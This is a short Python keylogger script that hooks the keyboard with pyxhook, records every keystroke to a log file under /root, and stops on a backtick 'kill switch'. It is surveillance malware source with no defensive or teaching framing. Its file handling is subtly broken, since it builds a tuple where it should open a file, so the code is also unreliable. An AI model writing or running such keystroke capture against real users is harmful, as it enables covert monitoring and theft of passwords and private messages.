import pyxhook

log_file = '/root/etc/keyFile.log'

def OnKeyPress(event):
	file_buffer = (log_file, 'a')
	file_buffer.write(event.Key)
	file_buffer.write('\n')

	if event.Ascii == 96: #kill switch enter key " ` " below ~
		file_buffer.close()
		key_hook.cancel()

key_hook = pyxhook.HookManager() #instantiate HookManager class
key_hook.KeyDown = OnKeyPress #listen to all keystrokes
key_hook.HookKeyboard() #hook the keyboard
key_hook.start() #start the session
